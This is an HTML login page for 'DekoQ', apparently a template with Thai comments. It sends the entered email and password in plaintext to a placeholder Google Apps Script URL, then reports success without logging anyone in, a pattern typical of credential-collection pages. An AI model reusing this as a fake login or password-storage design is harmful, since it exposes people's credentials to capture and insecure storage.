<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      text-align: center;
      color: white;
      margin-bottom: 1rem;
    }
    .container h1 {
      font-size: 3rem;
      margin: 0;
    }
    .container p {
      font-size: 1.2rem;
      margin-top: 0.5rem;
      margin-bottom: 2rem;
    }
    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 400px;
    }
    label {
      font-weight: bold;
      margin-bottom: 0.3rem;
      color: #000;
      text-align: left;
      display: block;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      font-size: 1rem;
      padding: 0.8rem 2.5rem 0.8rem 1rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-bottom: 1rem;
    }
    .password-wrapper {
      position: relative;
      width: 100%;
    }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .toggle-password svg {
      width: 20px;
      height: 20px;
      fill: #555;
    }
    button[type="submit"] {
      width: 100%;
      padding: 0.8rem;
      background: #222;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
      font-size: 1rem;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <h1>DekoQ</h1>
      <p>Welcome!</p>
    </div>
    <div class="login-box">
      <form id="form">
        <label for="email">Username/Email</label>
        <input type="email" id="email" name="email" required placeholder="Value" />

        <label for="password">Password</label>
        <div class="password-wrapper">
          <input type="password" id="password" name="password" required placeholder="Value" />
          <button type="button" class="toggle-password" onclick="togglePassword()">
            <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
              <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12c-2.8 0-5-2.2-5-5s2.2-5 5-5
              5 2.2 5 5-2.2 5-5 5zm0-8.5c-2 0-3.5 1.5-3.5 3.5S10 15.5 12 15.5 15.5 14 15.5 12 14 8.5 12 8.5z"/>
            </svg>
          </button>
        </div>
        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.querySelector("#form");
    const scriptURL = "YOUR_GOOGLE_SCRIPT_URL"; // <-- แก้ใส่ URL ตรงนี้

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
      .then(async response => {
        const text = await response.text();
        console.log("Raw response text:", text);
        if (response.ok) {
          alert("ส่งข้อมูลสำเร็จแล้ว!");
          form.reset();
        } else {
          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
        }
      })
      .catch(error => {
        alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
        console.error("Fetch Error!", error);
      });
    });

    function togglePassword() {
      const pwdInput = document.getElementById("password");
      const eyeIcon = document.getElementById("eyeIcon");
      const isHidden = pwdInput.type === "password";
      pwdInput.type = isHidden ? "text" : "password";
      eyeIcon.innerHTML = isHidden
        ? `<path d="M12 5c-7 0-11 7-11 7s4 7 11 7c2.2 0 4.2-.6 6-1.7l2 2 1.4-1.4-18-18L2.6 4.6l2 2C2.8 8.2 1 12 1 12s4 7 11 7c2.6 0 5-1 7-2.5l2.2 2.2 1.4-1.4-20-20L1.4 2.2l2 2C3.3 4.8 3 5.9 3 7c0 5 7 9 9 9 2 0 3.8-1 5-2.5l2.1 2.1C20.3 18.3 22 15.5 22 12c0-5-4-7-10-7z"/>`
        : `<path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12c-2.8 0-5-2.2-5-5s2.2-5 5-5
        5 2.2 5 5-2.2 5-5 5zm0-8.5c-2 0-3.5 1.5-3.5 3.5S10 15.5 12 15.5 15.5 14 15.5 12 14 8.5 12 8.5z"/>`;
    }
  </script>
</body>
</html>
